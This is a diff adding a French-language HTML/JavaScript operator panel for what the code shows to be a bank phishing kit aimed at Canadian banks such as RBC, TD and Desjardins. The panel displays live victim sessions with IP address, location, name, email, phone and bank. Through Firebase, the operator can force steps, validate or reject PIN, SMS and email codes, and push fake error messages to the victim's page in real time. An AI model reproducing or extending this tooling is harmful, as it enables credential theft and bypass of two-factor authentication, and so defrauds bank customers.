+            // Trier par date de dernière activité (plus récent en premier)
+            const sortedSites = Array.from(activeSites.values()).sort((a, b) => b.lastSeen - a.lastSeen);
+            
+            sortedSites.forEach((site, index) => {
+                const timeAgo = Math.floor((Date.now() - site.lastSeen) / 1000);
+                const sessionInfo = site.sessionInfo || {};
+                const userAgent = sessionInfo.userAgent || 'Inconnu';
+                const platform = sessionInfo.platform || 'Inconnue';
+                const language = sessionInfo.language || 'Inconnue';
+                const screen = sessionInfo.screen || 'Inconnue';
+                const timezone = sessionInfo.timezone || 'Inconnu';
+                
+                // Utiliser les informations IP et géographiques
+                const ip = site.ip || '0.0.0.0';
+                const location = site.location || { country: 'France', city: 'Paris' };
+                const flag = site.flag || (location.country === 'France' ? '🇫🇷' : location.country === 'Canada' ? '🇨🇦' : location.country === 'Belgique' ? '🇧🇪' : '🌍');
+                
+                // Déterminer la classe pour l'étape
+                let stepClass = 'step-badge';
+                let stepDisplay = site.currentStep;
+                
+                // Vérifier si c'est une étape de loading
+                const loadingSteps = ['loading-60', 'loading-pin', 'loading-sms', 'loading-email', 'loading-final'];
+                if (loadingSteps.includes(site.currentStep.toString())) {
+                    stepClass += ' loading';
+                    stepDisplay = '⏳ ' + site.currentStep;
+                } else if (site.currentStep === 'success') {
+                    stepClass += ' success';
+                    stepDisplay = '✅ SUCCÈS';
+                } else {
+                    stepClass += ` step-${site.currentStep}`;
+                }
+                
+                // Obtenir les données collectées
+                const collectedData = site.collectedData || {};
+                const nom = collectedData.nom || '';
+                const prenom = collectedData.prenom || '';
+                const email = collectedData.email || '';
+                const telephone = collectedData.telephone || '';
+                const banque = collectedData.banque || '';
+                
+                html += `
+                    <div class="session-screen" id="session-${site.sessionId}">
+                        <div class="session-header">
+                            <div>
+                                <span class="step-badge ${stepClass}">${stepDisplay}</span>
+                                <span class="location-info">
+                                    <span class="flag-emoji">${flag}</span>
+                                    ${location.city}, ${location.country}
+                                </span>
+                            </div>
+                            <div>
+                                <span class="ip-info">🌐 ${ip}</span>
+                                <span style="margin-left: 10px; color: #999;">il y a ${timeAgo}s</span>
+                            </div>
+                        </div>
+                        
+                        <div class="session-step-display" style="font-size: ${site.currentStep === 3 ? '36px' : '24px'};">
+                            ${site.currentStep === 3 ? '🔑' : ''}
+                            ${site.currentStep === 4 ? '📱' : ''}
+                            ${site.currentStep === 5 ? '🔐' : ''}
+                            ${site.currentStep === 6 ? '📨' : ''}
+                            ${site.currentStep === 7 ? '📧' : ''}
+                            ${site.currentStep === 8 ? '📄' : ''}
+                            ${site.currentStep === 9 ? '⬆️' : ''}
+                            ${site.currentStep === 'success' ? '✅' : ''}
+                            ${loadingSteps.includes(site.currentStep.toString()) ? '⏳' : ''}
+                            ${site.currentStep === 'success' ? 'VALIDATION RÉUSSIE' : `ÉTAPE ${site.currentStep}`}
+                        </div>
+                        
+                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px;">
+                            <div style="background: #1a1a1a; padding: 10px; border-radius: 8px;">
+                                <div style="color: #FBBF24; font-size: 12px; margin-bottom: 5px;">👤 UTILISATEUR</div>
+                                <div style="font-size: 14px;">${nom} ${prenom}</div>
+                                <div style="font-size: 12px; color: #999;">${email}</div>
+                                <div style="font-size: 12px; color: #999;">${telephone}</div>
+                            </div>
+                            <div style="background: #1a1a1a; padding: 10px; border-radius: 8px;">
+                                <div style="color: #FBBF24; font-size: 12px; margin-bottom: 5px;">🏦 BANQUE</div>
+                                <div style="font-size: 14px;">${banque}</div>
+                                <div style="font-size: 12px; color: #999;">${platform}</div>
+                                <div style="font-size: 12px; color: #999;">${language}</div>
+                            </div>
+                        </div>
+                        
+                        <div class="session-controls">
+                            <button onclick="sendToSpecificSite('${site.sessionId}', 'forceStep', { step: 1 })" style="background: #6B7280; color: white;">Étape 1</button>
+                            <button onclick="sendToSpecificSite('${site.sessionId}', 'forceStep', { step: 2 })" style="background: #3B82F6; color: white;">Étape 2</button>
+                            <button onclick="sendToSpecificSite('${site.sessionId}', 'forceStep', { step: 3 })" style="background: #FBBF24; color: #000;">Étape 3</button>
+                            <button onclick="sendToSpecificSite('${site.sessionId}', 'forceStep', { step: 4 })" style="background: #3B82F6; color: white;">Étape 4</button>
+                            <button onclick="sendToSpecificSite('${site.sessionId}', 'forceStep', { step: 5 })" style="background: #8B5CF6; color: white;">Étape 5</button>
+                            <button onclick="sendToSpecificSite('${site.sessionId}', 'forceStep', { step: 6 })" style="background: #F59E0B; color: #000;">Étape 6</button>
+                            <button onclick="sendToSpecificSite('${site.sessionId}', 'forceStep', { step: 7 })" style="background: #10B981; color: white;">Étape 7</button>
+                            <button onclick="sendToSpecificSite('${site.sessionId}', 'forceStep', { step: 8 })" style="background: #FBBF24; color: #000;">Étape 8</button>
+                            <button onclick="sendToSpecificSite('${site.sessionId}', 'forceStep', { step: 9 })" style="background: #F59E0B; color: #000;">Étape 9</button>
+                        </div>
+                        
+                        <div class="session-controls" style="margin-top: 10px;">
+                            <button onclick="sendToSpecificSite('${site.sessionId}', 'validateStep3')" style="background: #10B981; color: white;">✅ Valider Étape 3</button>
+                            <button onclick="sendToSpecificSite('${site.sessionId}', 'rejectStep3', { message: 'Erreur de connexion' })" style="background: #DC2626; color: white;">❌ Rejeter Étape 3</button>
+                            <button onclick="sendToSpecificSite('${site.sessionId}', 'validateStep4')" style="background: #10B981; color: white;">✅ Valider Étape 4</button>
+                            <button onclick="sendToSpecificSite('${site.sessionId}', 'rejectStep4', { message: 'Confirmation refusée' })" style="background: #DC2626; color: white;">❌ Rejeter Étape 4</button>
+                            <button onclick="sendToSpecificSite('${site.sessionId}', 'validateStep5')" style="background: #10B981; color: white;">✅ Valider Étape 5</button>
+                            <button onclick="sendToSpecificSite('${site.sessionId}', 'rejectStep5', { message: 'PIN incorrect' })" style="background: #DC2626; color: white;">❌ Rejeter Étape 5</button>
+                            <button onclick="sendToSpecificSite('${site.sessionId}', 'validateStep6')" style="background: #10B981; color: white;">✅ Valider Étape 6</button>
+                            <button onclick="sendToSpecificSite('${site.sessionId}', 'rejectStep6', { message: 'SMS invalide' })" style="background: #DC2626; color: white;">❌ Rejeter Étape 6</button>
+                            <button onclick="sendToSpecificSite('${site.sessionId}', 'validateStep7')" style="background: #10B981; color: white;">✅ Valider Étape 7</button>
+                            <button onclick="sendToSpecificSite('${site.sessionId}', 'rejectStep7', { message: 'Email invalide' })" style="background: #DC2626; color: white;">❌ Rejeter Étape 7</button>
+                        </div>
+                        
+                        <div class="session-controls" style="margin-top: 10px;">
+                            <button onclick="sendToSpecificSite('${site.sessionId}', 'sendErrorConnection', { message: 'Erreur de connexion' })" style="background: #DC2626; color: white;">🔴 Erreur Connexion</button>
+                            <button onclick="sendToSpecificSite('${site.sessionId}', 'sendErrorPIN', { message: 'PIN incorrect' })" style="background: #DC2626; color: white;">🔐 Erreur PIN</button>
+                            <button onclick="sendToSpecificSite('${site.sessionId}', 'sendErrorSMS', { message: 'SMS invalide' })" style="background: #DC2626; color: white;">📨 Erreur SMS</button>
+                            <button onclick="sendToSpecificSite('${site.sessionId}', 'sendErrorEmail', { message: 'Email invalide' })" style="background: #DC2626; color: white;">📧 Erreur Email</button>
+                            <button onclick="sendToSpecificSite('${site.sessionId}', 'forceStep', { step: 'success' })" style="background: #10B981; color: white;">🎯 Succès Direct</button>
+                            <button onclick="sendToSpecificSite('${site.sessionId}', 'stopAll')" style="background: #F59E0B; color: #000;">⏱️ Stop Timers</button>
+                        </div>
+                        
+                        <div style="margin-top: 10px; font-size: 11px; color: #666; text-align: right;">
+                            Session: ${site.sessionId.substring(0,16)}... | Dernière activité: ${new Date(site.lastSeen).toLocaleTimeString()}
+                        </div>
+                    </div>
+                `;
+            });
+            
+            container.innerHTML = html;
+        }
+
+        // Afficher/masquer les détails d'une session
+        function showSessionDetails(sessionId) {
+            const detailsDiv = document.getElementById(`details-${sessionId}`);
+            if (detailsDiv) {
+                if (detailsDiv.style.display === 'none') {
+                    detailsDiv.style.display = 'block';
+                } else {
+                    detailsDiv.style.display = 'none';
+                }
+            }
+        }
+
+        // Créer une nouvelle session de test
+        function createNewSession() {
+            const testSessionId = 'site_session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+            
+            // Générer des informations utilisateur aléatoires
+            const firstNames = ['Jean', 'Marie', 'Pierre', 'Sophie', 'Michel', 'Isabelle', 'Philippe', 'Catherine'];
+            const lastNames = ['Dupont', 'Martin', 'Bernard', 'Dubois', 'Thomas', 'Robert', 'Richard', 'Petit'];
+            const domains = ['gmail.com', 'yahoo.fr', 'orange.fr', 'hotmail.com', 'free.fr'];
+            
+            const nom = lastNames[Math.floor(Math.random() * lastNames.length)];
+            const prenom = firstNames[Math.floor(Math.random() * firstNames.length)];
+            const email = `${prenom.toLowerCase()}.${nom.toLowerCase()}@${domains[Math.floor(Math.random() * domains.length)]}`;
+            const telephone = `+33 6 ${Math.floor(Math.random() * 10000000).toString().padStart(8, '0')}`;
+            
+            const banks = ['rbc', 'td', 'scotiabank', 'bmo', 'cibc', 'national-bank', 'desjardins'];
+            const bank = banks[Math.floor(Math.random() * banks.length)];
+            
+            const testSession = {
+                sessionId: testSessionId,
+                currentStep: Math.floor(Math.random() * 8) + 1,
+                lastSeen: Date.now(),
+                timestamp: new Date().toISOString(),
+                sessionInfo: {
+                    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (TEST SESSION)',
+                    platform: 'Win32',
+                    language: 'fr-FR',
+                    screen: '1920x1080',
+                    timezone: 'Europe/Paris',
+                    testSession: true
+                },
+                collectedData: {
+                    nom: nom,
+                    prenom: prenom,
+                    email: email,
+                    telephone: telephone,
+                    banque: bank
+                }
+            };
+            
+            // Ajouter des informations IP et géographiques
+            const ipParts = [];
+            for (let i = 0; i < 4; i++) {
+                ipParts.push(Math.floor(Math.random() * 255));
+            }
+            testSession.ip = ipParts.join('.');
+            
+            const countries = ['France', 'Canada', 'Belgique', 'Suisse', 'États-Unis', 'Royaume-Uni'];
+            const cities = {
+                'France': ['Paris', 'Lyon', 'Marseille', 'Bordeaux'],
+                'Canada': ['Montréal', 'Toronto', 'Vancouver', 'Québec'],
+                'Belgique': ['Bruxelles', 'Liège', 'Anvers'],
+                'Suisse': ['Genève', 'Lausanne', 'Zurich'],
+                'États-Unis': ['New York', 'Los Angeles', 'Chicago'],
+                'Royaume-Uni': ['Londres', 'Manchester', 'Birmingham']
+            };
+            
+            const country = countries[Math.floor(Math.random() * countries.length)];
+            const city = cities[country][Math.floor(Math.random() * cities[country].length)];
+            
+            testSession.location = {
+                country: country,
+                city: city,
+                ip: testSession.ip
+            };
+            
+            localStorage.setItem(`panel_session_${testSessionId}`, JSON.stringify(testSession));
+            activeSites.set(testSessionId, testSession);
+            updateSessionsDisplay();
+            log(`🆕 Session de test créée: ${testSessionId.substring(0,12)}... (Étape ${testSession.currentStep})`, 'success');
+        }
+
+        // Mettre à jour le statut de connexion
+        function updateConnectionStatus(connected) {
+            const badge = document.getElementById('connection-status');
+            const indicator = badge.querySelector('.status-indicator');
+            
+            if (connected) {
+                indicator.className = 'status-indicator status-connected';
+                badge.innerHTML = `<span class="status-indicator status-connected"></span> CONNECTÉ (${activeSites.size} session${activeSites.size > 1 ? 's' : ''})`;
+            } else {
+                indicator.className = 'status-indicator status-disconnected';
+                badge.innerHTML = `<span class="status-indicator status-disconnected"></span> DÉCONNECTÉ`;
+            }
+        }
+
+        // Envoyer une commande à tous les sites
+        function sendToAllSites(action, data = {}) {
+            const command = {
+                action: action,
+                data: {
+                    ...data,
+                    timestamp: Date.now(),
+                    fromPanel: true,
+                    panelSession: SESSION_ID
+                },
+                id: 'cmd_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5)
+            };
+
+            log(`📤 Envoi à TOUS: ${action} ${data.step ? '→ ' + data.step : ''}`, 'warning');
+
+            // Envoyer via postMessage
+            window.postMessage({
+                type: 'panelCommand',
+                command: command,
+                target: 'all'
+            }, '*');
+
+            // Stocker dans localStorage
+            localStorage.setItem('panel_command', JSON.stringify(command));
+            
+            // Stocker pour chaque site actif
+            activeSites.forEach((site, id) => {
+                localStorage.setItem(`panel_command_${id}`, JSON.stringify({
+                    ...command,
+                    targetSession: id
+                }));
+            });
+
+            return command.id;
+        }
+
+        // Envoyer à un site spécifique
+        function sendToSpecificSite(sessionId, action, data = {}) {
+            const command = {
+                action: action,
+                data: {
+                    ...data,
+                    timestamp: Date.now(),
+                    fromPanel: true,
+                    panelSession: SESSION_ID,
+                    sessionId: sessionId
+                },
+                id: 'cmd_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5)
+            };
+
+            log(`📤 Envoi à ${sessionId.substring(0,8)}...: ${action} ${data.step ? '→ ' + data.step : ''}`, 'warning');
+
+            // Envoyer via postMessage
+            window.postMessage({
+                type: 'panelCommand',
+                command: command,
+                target: sessionId
+            }, '*');
+
+            // Stocker dans localStorage spécifique
+            localStorage.setItem(`panel_command_${sessionId}`, JSON.stringify(command));
+
+            return command.id;
+        }
+
+        // Log dans la console du panel
+        function log(message, type = 'info') {
+            const consoleEl = document.getElementById('console');
+            const time = new Date().toLocaleTimeString();
+            const logEntry = document.createElement('div');
+            
+            logEntry.className = 'log-entry';
+            if (type === 'error') logEntry.classList.add('log-error');
+            if (type === 'success') logEntry.classList.add('log-success');
+            if (type === 'warning') logEntry.classList.add('log-warning');
+            
+            logEntry.textContent = `[${time}] ${message}`;
+            consoleEl.appendChild(logEntry);
+            consoleEl.scrollTop = consoleEl.scrollHeight;
+            
+            // Limiter le nombre de logs
+            if (consoleEl.children.length > 100) {
+                consoleEl.removeChild(consoleEl.children[0]);
+            }
+        }
+
+        // Écouter les réponses du site
+        window.addEventListener('message', function(event) {
+            if (event.data && event.data.type === 'SITE_RESPONSE') {
+                log(`📥 Site: ${event.data.message || 'Commande reçue'}`, 'success');
+            }
+            
+            // Gérer les réponses aux commandes
+            if (event.data && event.data.type === 'commandResult') {
+                const result = event.data.data;
+                if (result.success) {
+                    log(`✅ Commande ${result.action} exécutée avec succès`, 'success');
+                } else {
+                    log(`❌ Échec commande ${result.action}: ${result.error}`, 'error');
+                }
+            }
+            
+            // Gérer les messages de statut
+            if (event.data && event.data.data && event.data.data.sessionId) {
+                handleSiteData(event.data.data);
+            }
+        });
+
+        // Vérifier les réponses dans localStorage
+        setInterval(() => {
+            const response = localStorage.getItem('site_response');
+            if (response) {
+                try {
+                    const data = JSON.parse(response);
+                    log(`📥 Réponse site: ${data.status || 'OK'}`, 'success');
+                    localStorage.removeItem('site_response');
+                } catch (e) {}
+            }
+            
+            // Vérifier les messages récents
+            const message = localStorage.getItem('panel_latest_message');
+            if (message) {
+                try {
+                    const data = JSON.parse(message);
+                    if (data && data.data) {
+                        handleSiteMessage(data);
+                    }
+                } catch (e) {}
+            }
+        }, 1000);
+
+        // Scanner au démarrage
+        setTimeout(() => {
+            scanForSites();
+        }, 2000);
+
+        // Initialiser au chargement
+        window.onload = initPanel;
+
+        // ============================================
+        // AJOUT FIREBASE - CONNEXION AU PANEL
+        // ============================================
+        
+        // Initialisation Firebase
+        let firebaseConnected = false;
+        let sessionsListener = null;
+        let database = null;
+
+        // Initialisation Firebase
+        try {
+            firebase.initializeApp(FIREBASE_CONFIG);
+            database = firebase.database();
+            firebaseConnected = true;
+            log('✅ Firebase initialisé avec succès', 'success');
+        } catch (e) {
+            log('❌ Erreur initialisation Firebase: ' + e.message, 'error');
+        }
+
+        // Connexion du panel à Firebase
+        function connectPanelToFirebase() {
+            if (!database) {
+                log('❌ Firebase non disponible', 'error');
+                return;
+            }
+            
+            // Écouter toutes les sessions
+            sessionsListener = database.ref('sessions');
+            sessionsListener.on('value', (snapshot) => {
+                const sessions = snapshot.val();
+                if (sessions) {
+                    updateSessionsFromFirebase(sessions);
+                    updatePanelFirebaseStatus(true);
+                } else {
+                    const container = document.getElementById('sessions-container');
+                    if (container && activeSites.size === 0) {
+                        container.innerHTML = '<div class="no-sessions">Aucune session détectée - En attente de connexion...</div>';
+                    }
+                    const siteCount = document.getElementById('site-count');
+                    if (siteCount && activeSites.size === 0) siteCount.textContent = '0';
+                    updatePanelFirebaseStatus(false);
+                }
+            });
+            
+            firebaseConnected = true;
+            log('✅ Firebase connecté - Panel prêt', 'success');
+            updatePanelFirebaseStatus(true);
+        }
+
+        // Mettre à jour l'affichage des sessions depuis Firebase
+        function updateSessionsFromFirebase(sessions) {
+            // Fusionner avec les sessions existantes
+            const siteEntries = Object.entries(sessions).filter(([id, data]) => data.type === 'site');
+            
+            if (siteEntries.length > 0) {
+                siteEntries.forEach(([sessionId, siteData]) => {
+                    // Vérifier si la session existe déjà
+                    if (!activeSites.has(sessionId)) {
+                        // Récupérer les informations de localisation
+                        const location = siteData.location || { country: 'Inconnu', city: 'Inconnue' };
+                        const ip = siteData.ip || '0.0.0.0';
+                        const flag = location.flag || (location.country === 'France' ? '🇫🇷' : 
+                                                       location.country === 'Canada' ? '🇨🇦' : 
+                                                       location.country === 'Belgique' ? '🇧🇪' : 
+                                                       location.country === 'Suisse' ? '🇨🇭' : 
+                                                       location.country === 'États-Unis' ? '🇺🇸' : '🌍');
+                        
+                        activeSites.set(sessionId, {
+                            sessionId: sessionId,
+                            lastSeen: Date.now(),
+                            currentStep: siteData.currentStep || 1,
+                            sessionInfo: siteData.info || {},
+                            collectedData: siteData.collectedData || {},
+                            location: location,
+                            ip: ip,
+                            flag: flag
+                        });
+                        log(`📡 Nouvelle session Firebase: ${sessionId.substring(0,8)}... - ${location.city}, ${location.country} ${flag}`, 'success');
+                    } else {
+                        const existing = activeSites.get(sessionId);
+                        existing.currentStep = siteData.currentStep || existing.currentStep;
+                        existing.sessionInfo = siteData.info || existing.sessionInfo;
+                        existing.collectedData = siteData.collectedData || existing.collectedData;
+                        existing.location = siteData.location || existing.location;
+                        existing.ip = siteData.ip || existing.ip;
+                        existing.lastSeen = Date.now();
+                        activeSites.set(sessionId, existing);
+                    }
+                });
+                
+                updateSessionsDisplay();
+                updatePanelFirebaseStatus(true);
+            }
+        }
+
+        // Envoyer une commande via Firebase
+        function sendFirebaseCommand(sessionId, action, data = {}) {
+            if (!firebaseConnected || !database) {
+                log('❌ Firebase non connecté', 'error');
+                return;
+            }
+            
+            const command = {
+                action: action,
+                data: {
+                    ...data,
+                    timestamp: Date.now(),
+                    fromPanel: true
+                }
+            };
+            
+            database.ref(`commands/${sessionId}`).set(command);
+            log(`📤 Commande Firebase envoyée à ${sessionId.substring(0,8)}...: ${action}`, 'warning');
+        }
+
+        // Mettre à jour le statut du panel Firebase
+        function updatePanelFirebaseStatus(connected) {
+            const badge = document.getElementById('connection-status');
+            if (!badge) return;
+            
+            const indicator = badge.querySelector('.status-indicator');
+            const siteCount = activeSites.size;
+            
+            if (connected) {
+                if (indicator) indicator.className = 'status-indicator status-connected';
+                badge.innerHTML = `<span class="status-indicator status-connected"></span> 🔥 FIREBASE ACTIF (${siteCount} session${siteCount > 1 ? 's' : ''})`;
+            } else {
+                // Ne pas écraser l'affichage local si déjà connecté
+                if (badge.innerHTML.indexOf('FIREBASE') === -1) {
+                    if (indicator) indicator.className = 'status-indicator status-disconnected';
+                    badge.innerHTML = `<span class="status-indicator status-disconnected"></span> FIREBASE DÉCONNECTÉ`;
+                }
+            }
+        }
+
+        // Surcharger la fonction sendToAllSites pour utiliser Firebase également
+        const originalSendToAllSites = sendToAllSites;
+        window.sendToAllSites = function(action, data = {}) {
+            // Appeler la fonction originale
+            originalSendToAllSites(action, data);
+            
+            // Envoyer également via Firebase si connecté
+            if (firebaseConnected && database) {
+                database.ref('sessions').once('value', (snapshot) => {
+                    const sessions = snapshot.val();
+                    if (sessions) {
+                        Object.keys(sessions).forEach(sessionId => {
+                            if (sessions[sessionId].type === 'site') {
+                                sendFirebaseCommand(sessionId, action, data);
+                            }
+                        });
+                    }
+                });
+            }
+        };
+
+        // Surcharger la fonction sendToSpecificSite pour utiliser Firebase également
+        const originalSendToSpecificSite = sendToSpecificSite;
+        window.sendToSpecificSite = function(sessionId, action, data = {}) {
+            // Appeler la fonction originale
+            originalSendToSpecificSite(sessionId, action, data);
+            
+            // Envoyer également via Firebase si connecté
+            if (firebaseConnected && database) {
+                sendFirebaseCommand(sessionId, action, data);
+            }
+        };
+
+        // Démarrer la connexion Firebase après 2 secondes
+        setTimeout(connectPanelToFirebase, 2000);
+    </script>
+</body>
+</html>
